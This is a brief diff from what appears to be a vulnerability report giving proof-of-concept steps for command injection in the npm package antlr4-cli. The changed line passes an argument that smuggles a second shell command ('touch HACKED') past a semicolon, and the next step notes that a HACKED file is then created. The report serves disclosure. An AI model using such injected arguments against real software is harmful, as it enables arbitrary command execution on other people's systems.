@@ -16,6 +16,6 @@ var antlr4 = require("antlr4-cli");
 
 ```bash
 npm i antlr4-cli # Install affected module
-node poc.js #  Run the PoC
+node poc.js 'simple_argument_in_single_quote;touch HACKED; #' # Run PoC
 ```
 4. Recheck the files: now `HACKED` has been created
